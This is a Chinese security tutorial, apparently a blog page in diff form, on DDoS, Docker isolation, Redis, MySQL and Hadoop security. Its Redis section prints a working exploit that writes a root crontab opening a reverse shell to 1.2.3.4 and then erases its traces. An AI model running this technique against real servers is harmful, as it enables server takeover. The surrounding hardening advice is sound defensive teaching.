+<p>但是，黑客如果直接对目标网络发起 DoS 攻击，很容易就会被溯源出来。所以，黑客会通过大量的“肉鸡”（被黑客远程控制的机器）来向目标网络发起请求，隐藏自己的真实地址。这个过程就是 DDoS。</p>
+<p>这里要补充一点，依靠“肉鸡”代理，黑客不仅可以增加自己被溯源的难度，还可以放大（或者说增强）攻击的效果。比如，当你请求一个网页时，你请求的数据实际上只有一个 URL，但服务器却需要返回给你一整个网页。</p>
+<p>近几年比较流行的基于 Memcache 的 DDoS，就是黑客向“肉鸡”的 Memcache 发送一个十几个字节的 GET 请求，通过在请求参数中进行配置，黑客可以让 Memcache 服务器将返回的结果发送到目标的服务器，而返回的结果能够达到几百 Kb 的数据量，放大倍数达到数万倍。这也是为什么黑客可以依靠几十个“肉鸡”代理，挤占目标网络几十 GB 的带宽。</p>
+<p>DDoS 能对内网造成非常严重的影响，那我们该如何进行防护呢？目前来说，DDoS 基本是不可防的。因为只要你的应用还在正常地提供服务，那就需要接收外网的请求，因此没办法直接拒绝黑客向你发起的请求。哪怕你能够识别出这些恶意的请求，并且拒绝响应，这也只能避免 CPU 被耗尽，而带宽的资源还是会被占用。</p>
+<p>所以，各类云服务厂商提供的 DDoS 解决方案，基本都是依靠带宽扩容来进行保障的。比如，阿里云可能会卖给你一个 40G 的防 DDoS 服务。只要 DDoS 的流量小于 40G，阿里云就会保障你服务的可用性。一旦超过，就会直接关停你的服务避免资源浪费。</p>
+<h2 id="Docker-安全"><a href="#Docker-安全" class="headerlink" title="Docker 安全"></a>Docker 安全</h2><p>我们讲了 Linux 系统安全。但是，当你在和同事讨论 Linux 系统安全的时候，同事表示，公司的服务都是通过 Docker 来进行容器化部署的。开发在操作中，并不会接触实际的 Linux 服务器，所以不会去关注 Linux 安全 。而且，因为容器是隔离的，就算容器被黑客攻击了，也只是容器内部受到影响，对宿主的 Linux 系统和网络都不会产生太大影响。</p>
+<p>事实上，我知道很多人都有这种想法。但是，可以试着思考一下，开发使用了 Docker 就一定安全吗？真的可以不用考虑安全问题了吗？</p>
+<p>以防你对 Doker 还不是很了解，在解决这些问题之前，我先来解释一下这节课会涉及的 3 个概念，帮你扫清概念障碍。</p>
+<ul>
+<li>Docker 服务：Docker 所提供的功能以及在宿主机 Linux 中的 Docker 进程。</li>
+<li>Docker 镜像：通过 Dockerfile 构建出来的 Docker 镜像。</li>
+<li>Docker 容器：实际运行的 Docker 容器，通常来说，一个 Docker 镜像会生成多个 Docker 容器。Docker 容器运行于 Docker 服务之上。</li>
+</ul>
+<h3 id="Docker-服务安全"><a href="#Docker-服务安全" class="headerlink" title="Docker 服务安全"></a>Docker 服务安全</h3><p>我们首先来看 Docker 服务的安全性。Docker 服务本身需要关注的安全性就是：隔离。如果黑客在控制了容器之后，能够成功对宿主机产生影响，就说明黑客突破了 Docker 服务的隔离保护，也就是我们所说的“Docker 逃逸”。</p>
+<p>我们首先来看 Docker 服务的安全性。Docker 服务本身需要关注的安全性就是：隔离。如果黑客在控制了容器之后，能够成功对宿主机产生影响，就说明黑客突破了 Docker 服务的隔离保护，也就是我们所说的“Docker 逃逸”。</p>
+<p><strong>第 1 个是 Namespace 机制。</strong></p>
+<p>我们知道，Docker 之所以广泛流行，是因为它提供了一种轻量化的隔离环境，也就是容器。</p>
+<p>下面，我们重点解释一下“轻量化”和“隔离”这两个词。首先是轻量化。怎么理解轻量化呢？我们可以对比虚拟机来进行理解。虚拟机是自己创造了一个虚拟内核，让这个虚拟内核去和虚拟机的进程进行沟通，然后虚拟内核再和真实的 Linux 内核进行沟通。而 Docker 提供的容器，简化了这个沟通过程，让 Docker 中的进程直接和 Linux 内核进行沟通。</p>
+<p><img src="/images/security/security-linux/6.jpg" alt="6"></p>
+<p>第二个词是隔离。也就是说，Docker 提供的容器环境是和 Linux 内核隔离的。想要实现这种隔离，就需要用到 Namespace 机制了。所以，这里我先给你简单解释一下什么是 Namespace 机制。</p>
+<p>Namespace 是 Linux 提供的一种标签机制，Linux 内核会对不同 Namespace 之间的进程做隔离，避免不同的进程之间互相产生影响。所以，Docker 服务会为每一个 Docker 容器创建一个单独的 Namespace 空间。 这样一来，不同容器之间、容器和系统之间，都是不同的 Namespace，也就实现了隔离。</p>
+<p>这种基于 Namespace 的隔离我一般叫它“伪隔离”。因为通过 Namespace 进行的隔离并不彻底。为啥这么说呢？Docker 容器在隔离的环境中，仍然需要使用一些底层的 Linux 进程和设备支持。比如，你在 Docker 容器中仍然需要使用鼠标、键盘等输入输出设备，那么容器就必须挂载 Linux 系统中的 /sys 来获得对应的驱动和配置信息。也就是说，你在 Docker 中看到的 /sys 目录，实际就是 Linux 系统中的 /sys 目录。类似的，还有一些没有被 Namespace 隔离开的目录和模块，包括以下这些内容：</p>
+<ul>
+<li>部分的进程目录 /proc/…</li>
+<li>内存映像 /dev/mem</li>
+<li>系统设备 /dev/sd*</li>
+<li>Linux 内核模块</li>
+</ul>
+<p>换一句话说，因为容器和宿主机需要共同使用一些服务（比如容器和宿主机使用的是同一个鼠标），所以上面的这些目录和模块，对于容器和宿主机来说，其实是共享的。从理论上来说，如果你在 Docker 容器中修改了这些目录，那么宿主机当中也会同步相应的修改结果。</p>
+<p><strong>第 2 个 Capabilities 机制。</strong></p>
+<p>我们刚刚说了，Namespace 的伪隔离机制让容器和宿主机共享部分目录。那么，这是不是也意味着，Docker 容器可以通过这些目录来影响宿主机，从而实现“Docker 逃逸”呢？为了避免这种情况，Docker 服务使用了 Capabilities 机制，来限制容器的操作。</p>
+<p>Capabilities 提供了更细粒度的授权机制，它定义了主体能够进行的某一类操作。比如，一个 Web 服务需要绑定 80 端口，但 80 端口的绑定是需要 ROOT 权限的。为了防止 ROOT 权限滥用，Docker 会通过 Capabilities，给予这个 Web 服务 net_bind_service 这个权限（允许绑定到小于 1024 的端口）。同样地，Docker 对容器的 ROOT 也加了很多默认的限制，比如：</p>
+<ul>
+<li>拒绝所有的挂载操作；</li>
+<li>拒绝部分文件的操作，比如修改文件所有者；</li>
+<li>拒绝内核模块加载。</li>
+</ul>
+<p>这里有一点需要你注意，Capabilities 对容器可进行操作的限制程度很难把控。这是因为，过松会导致 Docker 容器影响宿主机系统，让 Docker 隔离失效；过严会让容器和容器内的服务功能受限，无法正常运行。</p>
+<p>所以，在默认情况下，Docker 会采用白名单机制（白名单列表你可以在 Docker 源码中查看）进行限制，即只允许 Docker 容器拥有几个默认的能力。那有了白名单限制，即使黑客成功拿到了容器中的 ROOT 权限，能够造成的影响也相对较小。所以我们常说，“Docker 逃逸”是一件不容易的事情。</p>
+<p><strong>第 3 个是 CGroups 机制。</strong></p>
+<p>好了，现在你应该知道 Docker 服务本身是如何防止“Docker 逃逸”的了。作为一个容器，Docker 显然不能过多地占用宿主机资源，不然对宿主机和自身的可用性都会产生影响。那 Docker 是如何实现资源限制的呢？</p>
+<p>Docker 服务可以利用 CGroups 机制来实现对容器中内存、CPU 和 IO 等的限制。比如，通过下面的命令，我们就可以限制 Docker 容器只使用 2 个 CPU 和 100MB 的内存来运行了。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -it --cpus=2 --memory=<span class="string">"100m"</span> ubuntu:latest /bin/bash</span><br></pre></td></tr></table></figure>
+
+<p>所以，当一个宿主机中运行了多个 Docker 容器的时候，我们可以通过 CGroups，给每一个容器弹性地分配 CPU 资源。同样地，这个限制既不能过松，过松会导致某一个 Docker 容器耗尽宿主机资源，也不能过严，过严会使得容器内的服务得不到足够的资源支持。这都需要我们自己经过慎重考量来进行配置，没有默认的安全机制可以辅助我们。</p>
+<p>现在，你应该已经了解 Docker 服务中的 3 个主要机制了。这里，我把这 3 个主要机制的特点总结成了一张表格，帮助你加深理解。</p>
+<p><img src="/images/security/security-linux/7.jpg" alt="7"></p>
+<h3 id="Docker-守护进程"><a href="#Docker-守护进程" class="headerlink" title="Docker 守护进程"></a>Docker 守护进程</h3><p>想要运行 Docker 镜像，就必须先启动 Docker 的 Daemon 守护进程。而启动这个守护进程需要 ROOT 权限。因此，守护进程本身如果出现漏洞，就会给黑客提供一个权限提升的入口。那通过这个守护进程，黑客能进行哪些操作呢？</p>
+<p>首先，作为守护进程，Daemon 具备操控 Docker 容器的全部权限。这也就意味着，黑客可以任意地上线和下线容器、运行黑客自己的镜像、篡改已有镜像的配置等。这么说可能不够直观，我来详细解释一下。黑客通过守护进程，可以将宿主机的根目录共享到镜像中，这样一来，镜像就可以对宿主机的目录进行任意地修改了。另外，除了影响正常的线上容器，黑客还能够通过简单的 docker exec 命令获取容器环境中的 Shell，从而执行任意命令了。</p>
+<p>那么，黑客怎么才能控制 Daemon 守护进程呢？最简单的方法当然是直接进入宿主机，通过 Docker 命令进行交互。但如果黑客已经进入宿主机，还去操控容器，就是多此一举了。所以，黑客主要是通过远程 API，来对 Docker 守护进程发起攻击。</p>
+<p>守护进程提供的 API 接口，是为了方便用户去做一些自动化的工具，来操控 Docker 容器。而在默认情况下，这个 API 接口不需要进行认证。你可以尝试探测一下，你的公司内外网中，是否存在开放的 2375 端口（守护进程 API 默认监听的端口）。如果存在的话，那么你基本上就能够控制这台服务器的 Docker 守护进程了。</p>
+<p>为了避免这种无认证的情况发生，Docker 提供了证书的方式来进行认证。开启 API 接口的命令如下所示：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dockerd --tlsverify --tlscacert=ca.pem --tlscert=server-cert.pem --tlskey=server-key.pem -H=0.0.0.0:2376</span><br></pre></td></tr></table></figure>
+
+<p>通过以上命令，我们就能够在宿主机开启远程 API 接口。在客户端中，只需要提供相应的证书信息，就能够完成经过认证的 API 接口调用了。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl https://127.0.0.1:2376/images/json --cert cert.pem --key key.pem --cacert ca.pem</span><br></pre></td></tr></table></figure>
+
+<p>那通过这样的配置，我们就能解决了 API 接口的认证问题，也就提升了 Docker 守护进程的安全性。</p>
+<h3 id="Docker-镜像安全"><a href="#Docker-镜像安全" class="headerlink" title="Docker 镜像安全"></a>Docker 镜像安全</h3><p>了解了 Docker 守护进程的安全风险和防护方法之后，我们再来看一下 Docker 镜像的安全。</p>
+<p>对于 Docker 镜像来说，它本身就是一个模拟的操作系统，自然也会存在操作系统中的各类安全威胁和漏洞。但是，由于一个 Docker 镜像，一般只会运行某一种服务，也就相当于一个操作系统中只有一个用户。因此，Docker 镜像面临的安全威胁也会小很多。</p>
+<p>接下来，我就为你详细讲解两种保证 Docker 镜像安全的方式，分别是“使用最精简的镜像”和“最小权限原则”。</p>
+<h4 id="使用最精简的镜像"><a href="#使用最精简的镜像" class="headerlink" title="使用最精简的镜像"></a>使用最精简的镜像</h4><p>前面我们讲了 Docker 镜像的概念，我们知道，Docker 镜像是通过 Dockerfile 来构建的。而 Dockerfile 构建的第一句是 FROM ***。以 Node.js 的环境为例，你的基础镜像可能是 node，那么 Dockerfile 的第一行应该是 FROM node。</p>
+<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> node</span><br><span class="line"><span class="keyword">COPY</span><span class="bash"> . ./</span></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">8080</span></span><br><span class="line"><span class="keyword">CMD</span><span class="bash"> [“node”, “index.js”]</span></span><br></pre></td></tr></table></figure>
+
+<p>这个基础的 node 镜像实际包含了一个完整的操作系统，但是，在实际应用中，有大部分的系统功能，我们是用不到的。而这些用不到的系统功能，却正好为黑客提供了可乘之机。</p>
+<p>Snyk 在 2019 年的Docker 漏洞统计报告称，最热门的 10 个 Docker 基础镜像，包含的已知系统漏洞，最少的有 30 个，最多的有 580 个。</p>
+<p>这是非常惊人的。通过一句简单的 FROM node，就能让你的 Docker 镜像中引入 580 个系统漏洞。那我们该如何避免引入漏洞呢？这个时候，我们就需要使用精简版的基础镜像了。一般来说，精简版的 Docker 镜像标签都会带有 slim 或者 alpine。</p>
+<p>比如说，如果你采用 node:10-slim，那么漏洞数会降低到 71 个。如果使用 node:10-alpine，那么已知的漏洞数会降为 0。之所以会发生这种现象，是因为使用精简版的基础镜像，可以去除大部分无用的系统功能和依赖库，所以，存在于这些功能中的漏洞自然也就被剔除了。</p>
+<p>因此，对于 Docker 来说，通过使用精简的基础镜像，去除一些无用的系统功能，既能够降低最终镜像的体积，又能够降低安全风险，何乐而不为呢？</p>
+<h4 id="Docker-中的最小权限原则"><a href="#Docker-中的最小权限原则" class="headerlink" title="Docker 中的最小权限原则"></a>Docker 中的最小权限原则</h4><p>除此之外，我们在 Linux 操作系统中提到的最小权限原则，在 Docker 镜像中同样适用。</p>
+<p>这是因为，在默认情况下，容器内的进程是都以 ROOT 权限启动的。而 Docker 又是伪隔离，所以，容器就和宿主机拥有一致的 ROOT 权限了。虽然 Docker 通过 Capabilities，对容器内的 ROOT 能力进行了限制。但是，使用 ROOT 权限去运行一个普通的服务很不合适。为此，我们可以通过 USER 关键词，来使用一个低权限的用户运行服务。</p>
+<p>以 Node.js 为例，在 node 的基础镜像中，默认创建了 node 这么一个具备较小权限的用户。因此，我们可以在 Dockerfile 中，加入一行 USER node 来使用这个最小权限用户。</p>
+<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> node:<span class="number">10</span>-alpine </span><br><span class="line">...</span><br><span class="line"><span class="keyword">USER</span> node</span><br><span class="line"><span class="keyword">CMD</span><span class="bash"> [“node”, “index.js”]</span></span><br></pre></td></tr></table></figure>
+
+<p>当然，如果有的基础镜像本身不提供额外的用户，你就需要自己创建一个了。以 ubuntu 为例，我们可以通过 groupadd 和 useradd，创建一个 node 用户，这个用户没有密码、没有 home 目录、也没有 shell，就是一个最小权限用户。Dockerfile 的内容如下：</p>
+<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> ubuntu</span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> groupadd -r node &amp;&amp; useradd -r -s /bin/<span class="literal">false</span> -g node node</span></span><br><span class="line">...</span><br><span class="line"><span class="keyword">USER</span> node</span><br><span class="line"><span class="keyword">CMD</span><span class="bash"> node index.js</span></span><br></pre></td></tr></table></figure>
+
+<p>现在，你应该已经知道 Docker 镜像的两种安全防护方法了，我来简单总结一下。第一个是通过使用最精简的基础镜像，来删减 Docker 镜像中不必要的功能，从而降低出现漏洞的概率。第二个则是采取最小权限原则，以低权限用户来执行服务，限制黑客的能力。</p>
+<h2 id="数据库安全"><a href="#数据库安全" class="headerlink" title="数据库安全"></a>数据库安全</h2><h3 id="Redis-安全"><a href="#Redis-安全" class="headerlink" title="Redis 安全"></a>Redis 安全</h3><p>我们首先来看 Redis。我们都知道，Redis 是一个高性能的 KV 结构的数据库。Redis 的设计初衷是在可信的环境中，提供高性能的数据库服务。因此，Redis 在设计上没有过多地考虑安全性，甚至可以说它刻意地牺牲了一定的安全性，来获取更高的性能。</p>
+<p>那在安全性不高的情况下，黑客连入 Redis 能做什么呢？最直接的，黑客能够任意修改 Redis 中的数据。比如，通过一个简单 FLUSHALL 命令，黑客就能够清空整个 Redis 的数据了。</p>
+<p>复杂一些的，黑客还可以发起权限提升，通过 Redis 在服务器上执行命令，从而控制整个服务器。但是，Redis 本身不提供执行命令的功能，那么黑客是如何让 Redis 执行命令的呢？我们一起来看一下具体的代码流程。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">r = redis.Redis(host=10.0.0.1, port=6379, db=0, socket_timeout=10)</span><br><span class="line">payload = <span class="string">'\n\n*/1 * * * * /bin/bash -i &gt;&amp; /dev/tcp/1.2.3.4/8080 0&gt;&amp;1\n\n'</span></span><br><span class="line">path = <span class="string">'/var/spool/cron'</span></span><br><span class="line">name = <span class="string">'root'</span></span><br><span class="line">key = <span class="string">'payload'</span></span><br><span class="line">r.set(key, payload)</span><br><span class="line">r.config_set(<span class="string">'dir'</span>, path)</span><br><span class="line">r.config_set(<span class="string">'dbfilename'</span>, name)</span><br><span class="line">r.save()</span><br><span class="line">r.delete(key)  <span class="comment"># 清除痕迹</span></span><br><span class="line">r.config_set(<span class="string">'dir'</span>, <span class="string">'/tmp'</span>)</span><br></pre></td></tr></table></figure>
+
+<p>针对这个过程，我来详细解释一下，你可以结合代码来看。</p>
+<ul>
+<li>黑客连入 Redis。</li>
+<li>黑客写入一个任意的 Key，对应的 Value 是想要执行的命令，并按照 Crontab 的格式进行拼接。代码如下：</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*/1* * * * /bin/bash -i &gt;&amp; /dev/tcp/1.2.3.4/80800&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>黑客调用 config_set 方法，就是通过 Redis 的 CONFIG 命令，将 Redis 数据持久化的目录修改成 /var/spool/cron。</li>
+<li>黑客调用 save 方法，通过 Redis 的 SAVE 命令，发起 Redis 的数据持久化功能。最终，Redis 将数据写入到 /var/spool/cron 中。写入的文件效果如下：</li>
+</ul>
+<p><img src="/images/security/security-linux/8.jpg" alt="8"></p>
+<ul>
+<li>Crontab 对于无法解析的数据会直接跳过，因此，开头和结尾的乱码不会影响 Crontab 的执行。最终，Crontab 会执行到 Value 中对应的命令。</li>
+</ul>
+<p>这样一来，黑客就“聪明”地利用 Redis 保存文件的功能，修改了 Crontab，然后利用 Crontab 执行了命令。</p>
+<p>那么，我们该如何对 Redis 进行安全防护呢？这里就需要提到我们前面讲过的“黄金法则”和“最小权限原则”了。</p>
+<p>首先，从认证上来说，Redis 提供了最简单的密码认证功能。在 Redis 的配置文件中，只要增加一行 requirepass 123456，我们就能够为 Redis 设置一个密码了。但是，这里有两点需要你注意。</p>
+<ul>
+<li><p>Redis 的性能很高，理论上黑客能够以每秒几十万次的速度来暴力猜测密码。因此，你必须设置一个足够强的密码。我比较推荐随机生成一个 32 位的“数字加字母”的密码。而且 Redis 的密码直接保存在配置文件当中，你并不需要记忆它，需要的时候直接查看就好了。</p>
+</li>
+<li><p>Redis 是为了高性能而设计的。之所以 Redis 默认不配置密码，就是因为密码会影响性能。按照我之前的测试，加上密码之后，Redis 的整体性能会下降 20% 左右。这也是很多开发和运维，明明知道 Redis 有安全风险，仍然保持无密码状态的原因。所以，是否给 Redis 设置密码，还需要你根据实际的情况进行权衡。</p>
+</li>
+</ul>
+<p>其次是进行授权。尽管 Redis 本身不提供授权机制，但是我们仍然可以通过“重命名”来间接地实现授权功能。我们可以在 Redis 的配置文件中加入 rename-command CONFIG pUVEYEvdaGH2eAHmNFcDh8Qf9vOej4Ho，就可以将 CONFIG 功能的关键词，变成一个随机的字符串，黑客不知道这个字符串，就无法执行 CONFIG 功能了。而且，你仍然可以通过新的命令，来正常的使用 CONFIG 功能，不会对你的正常操作产生任何影响。</p>
+<p>现在，你应该已经知道在认证和授权上，我们能使用的防护手段了。那在审计上，因为 Redis 只提供了基本的日志功能（日志等级分为：Debug、Verbose、Notice 和 Warning），实用信息不多，也就没有太多的应用价值。</p>
+<p>除了认证和授权，如果你还想要对 Redis 中的数据进行加密，那你只能够在客户端中去集成相应的功能，因为 Redis 本身不提供任何加密的功能和服务。</p>
+<p>最后，我们还要避免使用 ROOT 权限去启动 Redis，这就需要用到“最小权限原则”了。在前面命令执行的例子中，黑客是通过 Redis 的保存功能，将命令“写入 Crontab”来实现的命令执行功能。而“写入 Crontab”这个操作，其实是需要 ROOT 权限的。因此，我们以一个低权限的用户（比如 nobody）身份来启动 Redis，就能够降低黑客连入 Redis 带来的影响了。当然，Redis 本身也需要保存日志和持久化数据，所以，它仍然需要写入日志文件的权限（小于 ROOT 权限）来保证正常运行。</p>
+<p>总结来说，Redis 是一个极度看重性能的数据库，为了性能舍弃掉了部分的安全功能。我们可以通过“增加密码”“使用最小权限原则”和“授权”的方式，在一定程度上提升 Redis 的安全性。但是，这些防护手段更多的是一种缓解机制，为了保证安全性，我们最好是只在可信的网络中使用 Redis。</p>
+<h3 id="MySQL-安全"><a href="#MySQL-安全" class="headerlink" title="MySQL 安全"></a>MySQL 安全</h3><p>讲到这里，你现在应该也能总结出，黑客攻击数据库的主要方式，除了执行各种命令对数据库中的数据进行“增删改查”，就是在连入数据库后，通过各种手段实现命令执行，最终控制整个服务器。</p>
+<p>因为 MySQL 的功能十分强大，自身就提供了和本地文件交互的功能。所以，通过 LOAD DATA INFILE，MySQL 可以读取服务器的本地文件；通过 SELECT … INTO DUMPFILE，MySQL 也能够将数据写入到本地文件中。因此，在黑客连入 MySQL 之后，通过读文件的功能，黑客就能够对服务器的任意文件进行读取，比如敏感的 /etc/passwd 或者应用的源代码等；通过写文件的功能，则可以仿照 Redis 修改 Crontab 的原理，实现命令执行的功能。</p>
+<p>相比于 Redis，MySQL 是一个比较成熟的数据库工具，自身的安全性就很高，所以通过正确地配置 MySQL 的安全选项，我们就能够获得较高的安全保障。</p>
+<p>那么，MySQL 在黄金法则和加密上，分别提供了哪些功能呢？</p>
+<p>MySQL 提供了多用户的认证体系，它将用户的相关信息（认证信息、权限信息）都存储在了 mysql.user 这个系统表中。利用这个系统表，MySQL 可以通过增删改查操作，来定义和管理用户的认证信息、权限列表等。</p>
+<p>除此之外，在认证上，MySQL 还提供了比较完善的密码管理功能，它们分别是：</p>
+<ul>
+<li>密码过期，强制用户定期修改密码；</li>
+<li>密码重用限制，避免用户使用旧的密码；</li>
+<li>密码强度评估，强制用户使用强密码；</li>
+<li>密码失败保护，当用户出现太多密码错误的尝试后锁定账户。</li>
+</ul>
+<p>那么，通过这些密码管理的机制，你就能够拥有一个相对安全的认证体系了。</p>
+<p>在多用户的认证体系中，授权是必不可少的。那 MySQL 中的授权机制是怎样的呢？</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GRANT</span> <span class="keyword">ALL</span> <span class="keyword">PRIVILEGES</span> <span class="keyword">ON</span> db.table <span class="keyword">TO</span> <span class="keyword">user</span>@<span class="string">"127.0.0.1"</span> <span class="keyword">IDENTIFIED</span> <span class="keyword">BY</span> <span class="string">"password"</span></span><br></pre></td></tr></table></figure>
+
+<p>我们通过修改权限的 GRANT 命令来具体分析一下，MySQL 授权机制中的主体、客体和请求。</p>
+<ul>
+<li>主体（user@“127.0.0.1” IDENTIFIED BY “password”）：MySQL 的主体是通过用户名、IP 和密码这三个信息组合起来进行标记的。</li>
+<li>客体（db.table）：MySQL 的客体是数据库和表。</li>
+<li>请求（ALL PRIVILEGES）：MySQL 将请求的类型定义成了特权（PRIVILEGES）。常见的特权有 INSERT、DELETE 等增删改查操作（如果你想要了解其他更细粒度的特权，可以在官方文档中进行查看）。</li>
+</ul>
+<p>除此之外，MySQL 也定义了 ROLE 的概念，你可以基于这个功能，去实现 role-BAC 机制。</p>
+<p>虽然和 Redis 一样，MySQL 本身也不提供审计功能。但是，MySQL 可以通过第三方插件，来提供审计的服务。比如 McAfee 提供的mysql-audit以及MariaDB Audit Plugin。这些插件能够自动收集必要的 MySQL 操作信息，并推送到你的 ELK 等日志集群中，方便你进行持续的审计操作。</p>
+<p>在加密方面，MySQL 既提供传输过程中 SSL（Security Socket Layer）加密，也提供存储过程中硬盘加密。</p>
+<p>我们首先来看 MySQL 的 SSL 加密功能。开启 SSL 功能，需要在配置文件中配置如下命令：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[mysqld]</span><br><span class="line">ssl-ca&#x3D;ca.pem</span><br><span class="line">ssl-cert&#x3D;server-cert.pem</span><br><span class="line">ssl-key&#x3D;server-key.pem</span><br></pre></td></tr></table></figure>
+
+<p>但是，这些配置并不能强制客户端使用 SSL 连接。想要杜绝全部非安全连接的话，我们可以在配置文件中添加 require_secure_transport=ON，来进行强制限制。</p>
+<p>接着，我们来看，MySQL 中提供的硬盘加密功能。硬盘加密过程主要涉及两个密钥，一个主密钥和一个表密钥。表密钥由 MySQL 随机生成，通过主密钥进行加密后，存储在表头信息中。因此，每一个表格都拥有不同的密钥。</p>
+<p>MySQL 的加密功能是由 keyring_file 这个插件来提供的。需要注意的是，当 keyring_file 第一次启动的时候，它会生成一个主密钥文件在当前的系统中。你一定要备份这个密钥文件，因为它一旦丢失，数据库中的全部数据，都将因为无法解密而丢失。</p>
+<p>现在，你应该了解了，MySQL 在黄金法则上都提供了哪些功能。接下来，我们再来看“最小权限原则”。</p>
+<p>和 Redis 一样，MySQL 也需要避免以 ROOT 权限启动。不一样的是，MySQL 默认提供了这样的能力，当我们在 Linux 中通过 mysqld 来启动 MySQL 进程的时候，mysqld 会自动的创建一个具备最小权限的 mysql 用户，并赋予这个用户对应日志文件的权限，保证 MySQL 拥有必要的最小权限。</p>
+<p>总之，MySQL 是一个非常成熟的数据库工具，它提供了完整的安全功能。通过对认证、授权、审计和加密功能的正确配置，你就能够迅速提升 MySQL 的整体安全性。</p>
+<p>今天，我们以 Redis 和 MySQL 这两种比较典型的数据库为例，对它们的安全性，以及攻破后能产生的危害进行了分析。在这里，我把安全防护的关键内容总结了一张表格，希望能够帮助你加深理解。</p>
+<p><img src="/images/security/security-linux/9.jpg" alt="9"></p>
+<h2 id="分布式安全"><a href="#分布式安全" class="headerlink" title="分布式安全"></a>分布式安全</h2><p>如今，大数据处理已经成为了每一个应用和公司都必备的业务。因此，除了数据库之外，分布式的平台和框架也是开发人员最熟悉的工具之一。</p>
+<p>说到分布式，就不得不提到 Hadoop。Hadoop 可以说是一个划时代的分布式框架，底层的 HDFS 提供了大数据存储的文件系统支持，YARN 提供了大数据运算的资源调度能力，而 MapReduce 的计算框架，更是彻底革新了数据运算的方式。基于此，Hadoop 又衍生了一系列的分布式工具和数据处理生态圈。</p>
+<p>可以说，Hadoop 是分布式框架的根基。所以，我们今天就以 Hadoop 为例，探讨一下分布式框架的安全性。</p>
+<h3 id="针对-Hadoop-的攻击方式有哪些？"><a href="#针对-Hadoop-的攻击方式有哪些？" class="headerlink" title="针对 Hadoop 的攻击方式有哪些？"></a>针对 Hadoop 的攻击方式有哪些？</h3><p>Hadoop 最开始是设计工作在可信的网络中的，所以，Hadoop 的默认安全防护机制并不强。这也就使得 Hadoop 中的数据安全得不到保障。而 Hadoop 作为大数据的处理框架，可以说公司大部分的数据都会落到其中进行处理。因此，Hadoop 中数据 CIA 的重要性，甚至比普通的数据库更高。</p>
+<p>那么，黑客可以通过哪些方式来攻击 Hadoop 呢？</p>
+<p>首先，最直接也是最常见的，也就是在默认情况下，Hadoop 没有集成认证和授权功能，任何人都可以通过客户端的形式连入到 Hadoop 集群中。所以，黑客可以任意地增删改查 HDFS 中的数据，也可以任意地提交 Hadoop 任务，来进行自己想要的数据操作。</p>
+<p>除了直接的越权访问，黑客也可以通过一些间接的方式，来窃取 Hadoop 中的数据。比如，Hadoop 节点间的数据传输默认都是明文的。因此，即使黑客无法连入到 Hadoop 集群中，它们也可以通过控制交换机等网络设备，同样能够获得很多的数据信息。</p>
+<p>最后，因为 Hadoop 能够很好地支持节点的增加和删除操作。所以，黑客可以以一个节点的身份加入到 Hadoop 集群中。这样一来，数据就会自动流转到黑客的节点中。如果伪装的是具备调度功能的 NameNode，黑客还能够对整个 Hadoop 集群的资源调度进行干预和影响。</p>
+<h3 id="Hadoop-自带的安全功能有哪些？"><a href="#Hadoop-自带的安全功能有哪些？" class="headerlink" title="Hadoop 自带的安全功能有哪些？"></a>Hadoop 自带的安全功能有哪些？</h3><p>现在，你应该知道了，黑客针对 Hadoop 的攻击一旦发生，就会造成非常大的危害。那我们该如何提高 Hadoop 的安全性呢？和数据库一样，我们还是分别从认证、授权、审计和加密这四个方面来看。</p>
+<h3 id="黄金法则在-Hadoop-上如何应用？"><a href="#黄金法则在-Hadoop-上如何应用？" class="headerlink" title="黄金法则在 Hadoop 上如何应用？"></a>黄金法则在 Hadoop 上如何应用？</h3><p>首先，我们来看，如何给 Hadoop 加上认证的功能。目前，Hadoop 支持了基于 Kerberos 协议的认证功能，我们可以在配置文件中使用。</p>
+<p>那 Kerberos 协议是什么呢？Kerberos 协议和我们之前讲过的单点登录机制（CAS 流程）很类似，都是向认证中心获取一个认证 Token，然后根据 Token 去完成服务的认证。区别在于，Kerberos 都是主动向认证中心发起认证，不需要服务去进行重定向操作。</p>
+<p><img src="/images/security/security-linux/10.jpg" alt="10"></p>
+<p>接下来，我带你梳理一下 Kerberos 的流程，你可以结合上面的流程图来看。</p>
+<p>用户在向 KDC（Kerberos 的认证中心）发起登录之后，会获取一个 Token（Kerberos 的 ST），然后通过这个 Token 去访问对应的服务。Token 中包含了签名，因此服务方可以自行验证 Token 的合法性。在认证完成之后，服务方就可以向用户提供服务了。</p>
+<p>Kerberos 比较适用于服务与服务之间的认证，对应到 Hadoop 的场景中，就是 Hadoop 集群中内部各个节点之间的认证。</p>
